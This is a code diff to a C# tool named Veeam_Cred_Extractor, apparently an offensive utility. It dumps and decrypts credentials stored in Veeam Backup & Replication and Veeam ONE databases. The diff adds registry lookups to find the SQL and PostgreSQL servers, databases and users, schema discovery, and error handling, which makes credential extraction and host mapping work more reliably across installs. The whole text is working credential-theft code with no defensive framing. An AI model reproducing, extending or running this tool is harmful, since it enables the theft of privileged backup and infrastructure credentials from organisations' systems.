@@ -56,7 +56,6 @@ namespace Veeam_Cred_Extractor
             string action = args[0].ToLower();
             string veeamDbName = "VeeamBackup";
             string veeamOneDb = "VeeamONE";
-            string veeamOneSQL = "VeeamSQL2017";
             string sqlcmdPath = "sqlcmd.exe";
             string psqlPath = null;
             string targetUser = null;
@@ -127,20 +126,38 @@ namespace Veeam_Cred_Extractor
                     // Decrypt creds
                     if (veeamOne)
                     {
-                        string resolvedServer = sqlServerName ?? $".\\{veeamOneSQL}";
+                        var oneRegKey = @"SOFTWARE\Veeam\Veeam ONE";
+                        var oneRegValues = GetVeeamRegistryValues(oneRegKey, "DatabaseServer", "DatabaseName");
+                        oneRegValues.TryGetValue("DatabaseServer", out var regServer);
+                        oneRegValues.TryGetValue("DatabaseName", out var regDb);
+
+                        string resolvedServer = sqlServerName ?? regServer;
+                        string resolvedDb = veeamOneDb;
+                        if (regDb != null && veeamOneDb == "VeeamONE")
+                            resolvedDb = regDb;
+
+                        if (string.IsNullOrEmpty(resolvedServer))
+                        {
+                            Console.WriteLine("[ERROR] Veeam One SQL Server not found in registry. Use -s to specify it manually.");
+                            return;
+                        }
+
                         Console.WriteLine($"[INFO] MSSQL instance: {resolvedServer}");
-                        Console.WriteLine($"[INFO] Database: {veeamOneDb}");
+                        Console.WriteLine($"[INFO] Database: {resolvedDb}");
                         Console.WriteLine($"[INFO] Sqlcmd.exe path: {sqlcmdPath}");
+
+                        string schema = DiscoverSchema(sqlcmdPath, resolvedServer, resolvedDb, "Credentials") ?? "monitor";
+                        Console.WriteLine($"[INFO] Discovered schema: {schema}");
 
                         if (listUsers)
                         {
 
-                            query = "SELECT username,description FROM [monitor].[Credentials];";
+                            query = $"SELECT username,description FROM [{schema}].[Credentials];";
 
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -y 8000 -w 65535",
+                                Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -y 8000 -w 65535",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -157,17 +174,17 @@ namespace Veeam_Cred_Extractor
                             if (targetUser != null)
                             {
                                 string safeUser = targetUser.Replace("'", "''");
-                                query = $"SELECT username,password,description FROM [monitor].[Credentials] WHERE LOWER(username) = LOWER('{safeUser}');";
+                                query = $"SELECT username,password,description FROM [{schema}].[Credentials] WHERE LOWER(username) = LOWER('{safeUser}');";
                             }
                             else
                             {
-                                query = "SELECT username,password,description FROM [monitor].[Credentials];";
+                                query = $"SELECT username,password,description FROM [{schema}].[Credentials];";
                             }
 
                             var psi = new ProcessStartInfo
                             {
                                 FileName = sqlcmdPath,
-                                Arguments = $"-S {resolvedServer} -E -d {veeamOneDb} -Q \"{query}\" -h -1 -s\":\" -y 8000 -w 65535",
+                                Arguments = $"-S {resolvedServer} -E -d {resolvedDb} -Q \"{query}\" -h -1 -s\":\" -y 8000 -w 65535",
                                 RedirectStandardOutput = true,
                                 RedirectStandardError = true,
                                 UseShellExecute = false,
@@ -259,8 +276,14 @@ namespace Veeam_Cred_Extractor
                     if (psqlExe == null)
                         throw new Exception("psql.exe not found. Provide path using -p option.");
 
+                    var psqlRegValues = GetVeeamRegistryValues(
+                        @"SOFTWARE\Veeam\Veeam Backup and Replication\DatabaseConfigurations\postgresql",
+                        "PostgresUserForWindowsAuth");
+                    string psqlUser = psqlRegValues.TryGetValue("PostgresUserForWindowsAuth", out var regPsqlUser) ? regPsqlUser : "postgres";
+
                     Console.WriteLine($"[INFO] PostgreSQL binary: {psqlExe}");
                     Console.WriteLine($"[INFO] Database: {veeamDbName}");
+                    Console.WriteLine($"[INFO] PostgreSQL user: {psqlUser}");
 
                     if (listUsers)
                     {
@@ -270,7 +293,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = psqlExe,
-                            Arguments = $"-d {veeamDbName} -U postgres -A -F : -t -c \"{query}\"",
+                            Arguments = $"-d {veeamDbName} -U {psqlUser} -A -F : -t -c \"{query}\"",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -297,7 +320,7 @@ namespace Veeam_Cred_Extractor
                         var psi = new ProcessStartInfo
                         {
                             FileName = psqlExe,
-                            Arguments = $"-d {veeamDbName} -U postgres -A -F : -t -c \"{query}\"",
+                            Arguments = $"-d {veeamDbName} -U {psqlUser} -A -F : -t -c \"{query}\"",
                             RedirectStandardOutput = true,
                             RedirectStandardError = true,
                             UseShellExecute = false,
@@ -475,8 +498,8 @@ namespace Veeam_Cred_Extractor
                             else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                             {
                                 var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
-                                if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
-                                    Console.WriteLine($"  - PSQL username: {uname}");
+                                string mapPsqlUser = psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname) ? uname : "postgres";
+                                Console.WriteLine($"  - PSQL username: {mapPsqlUser}");
                                 psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                 string mapPsqlDb = vdb ?? veeamDbName;
                                 Console.WriteLine($"  - PSQL database: {mapPsqlDb}");
@@ -492,7 +515,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = psqlExe,
-                                    Arguments = $"-d {mapPsqlDb} -U postgres -A -F : -t -c \"{query}\"",
+                                    Arguments = $"-d {mapPsqlDb} -U {mapPsqlUser} -A -F : -t -c \"{query}\"",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -538,7 +561,10 @@ namespace Veeam_Cred_Extractor
                             return;
                         }
 
-                        string query = "SELECT t1.username, STUFF((SELECT ', ' + t3.host_name FROM [monitor].[CredentialsLink] AS t2 INNER JOIN [monitor].[Entity] AS t3 ON t2.entity_id = t3.host_id WHERE t2.cred_id = t1.id ORDER BY t3.host_name FOR XML PATH('')), 1, 2, '') as hosts FROM [monitor].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [monitor].[CredentialsLink] WHERE cred_id = t1.id) ORDER BY t1.username;";
+                        string schema = DiscoverSchema(sqlcmdPath, resolvedServer, resolvedDb, "Credentials") ?? "monitor";
+                        Console.WriteLine($"[INFO] Discovered schema: {schema}");
+
+                        string query = $"SELECT t1.username, STUFF((SELECT ', ' + t3.host_name FROM [{schema}].[CredentialsLink] AS t2 INNER JOIN [{schema}].[Entity] AS t3 ON t2.entity_id = t3.host_id WHERE t2.cred_id = t1.id ORDER BY t3.host_name FOR XML PATH('')), 1, 2, '') as hosts FROM [{schema}].[Credentials] AS t1 WHERE EXISTS (SELECT 1 FROM [{schema}].[CredentialsLink] WHERE cred_id = t1.id) ORDER BY t1.username;";
                         var psi = new ProcessStartInfo
                         {
                             FileName = sqlcmdPath,
@@ -646,8 +672,8 @@ namespace Veeam_Cred_Extractor
                             else if (string.Equals(dbtype, "postgresql", StringComparison.OrdinalIgnoreCase))
                             {
                                 var psqlValues = GetVeeamRegistryValues(dbConfigKey + @"\postgresql", "PostgresUserForWindowsAuth", "SqlDatabaseName");
-                                if (psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname))
-                                    Console.WriteLine($"  - PSQL username: {uname}");
+                                string autoPsqlUser = psqlValues.TryGetValue("PostgresUserForWindowsAuth", out var uname) ? uname : "postgres";
+                                Console.WriteLine($"  - PSQL username: {autoPsqlUser}");
                                 psqlValues.TryGetValue("SqlDatabaseName", out var vdb);
                                 string autoPsqlDb = vdb ?? veeamDbName;
                                 Console.WriteLine($"  - PSQL database: {autoPsqlDb}");
@@ -663,7 +689,7 @@ namespace Veeam_Cred_Extractor
                                 var psi = new ProcessStartInfo
                                 {
                                     FileName = psqlExe,
-                                    Arguments = $"-d {autoPsqlDb} -U postgres -A -F : -t -c \"{query}\"",
+                                    Arguments = $"-d {autoPsqlDb} -U {autoPsqlUser} -A -F : -t -c \"{query}\"",
                                     RedirectStandardOutput = true,
                                     RedirectStandardError = true,
                                     UseShellExecute = false,
@@ -712,7 +738,10 @@ namespace Veeam_Cred_Extractor
                             return;
                         }
 
-                        string query = "SELECT username,password,description FROM [monitor].[Credentials];";
+                        string schema = DiscoverSchema(sqlcmdPath, resolvedServer, resolvedDb, "Credentials") ?? "monitor";
+                        Console.WriteLine($"[INFO] Discovered schema: {schema}");
+
+                        string query = $"SELECT username,password,description FROM [{schema}].[Credentials];";
 
                         var psi = new ProcessStartInfo
                         {
@@ -840,6 +869,52 @@ namespace Veeam_Cred_Extractor
             return result;
         }
 
+        static string DiscoverSchema(string sqlcmdPath, string server, string database, string tableName)
+        {
+            string query = $"SELECT TOP 1 TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME = '{tableName}';";
+            var psi = new ProcessStartInfo
+            {
+                FileName = sqlcmdPath,
+                Arguments = $"-S {server} -E -d {database} -Q \"{query}\" -h -1 -w 65535",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            try
+            {
+                using (var process = Process.Start(psi))
+                {
+                    var errorBuilder = new StringBuilder();
+                    process.ErrorDataReceived += (s, e) => { if (e.Data != null) errorBuilder.AppendLine(e.Data); };
+                    process.BeginErrorReadLine();
+                    string output = process.StandardOutput.ReadToEnd();
+                    process.WaitForExit();
+
+                    if (!string.IsNullOrEmpty(errorBuilder.ToString()) || output.TrimStart().StartsWith("Msg "))
+                        return null;
+
+                    using (var reader = new StringReader(output))
+                    {
+                        string line;
+                        while ((line = reader.ReadLine()) != null)
+                        {
+                            line = line.Trim();
+                            if (!string.IsNullOrWhiteSpace(line) && !line.StartsWith("("))
+                                return line;
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                if (DEBUG)
+                    Console.WriteLine($"[DEBUG] Schema discovery failed: {ex.Message}");
+            }
+            return null;
+        }
+
         static void RunAndProcess(ProcessStartInfo psi, bool readOnly, bool veeamOne)
         {
             using (var process = Process.Start(psi))
@@ -862,6 +937,12 @@ namespace Veeam_Cred_Extractor
                 if (!string.IsNullOrEmpty(error))
                 {
                     Console.WriteLine($"[ERROR] SQL: {error}");
+                    return;
+                }
+
+                if (output.TrimStart().StartsWith("Msg ") || output.Contains("Invalid object name"))
+                {
+                    Console.WriteLine($"[ERROR] SQL: {output.Trim()}");
                     return;
                 }
 
@@ -1026,6 +1107,12 @@ namespace Veeam_Cred_Extractor
                 if (!string.IsNullOrWhiteSpace(error))
                 {
                     Console.WriteLine($"[ERROR] SQL: {error}");
+                    return new List<string[]>();
+                }
+
+                if (output.TrimStart().StartsWith("Msg ") || output.Contains("Invalid object name"))
+                {
+                    Console.WriteLine($"[ERROR] SQL: {output.Trim()}");
                     return new List<string[]>();
                 }
 
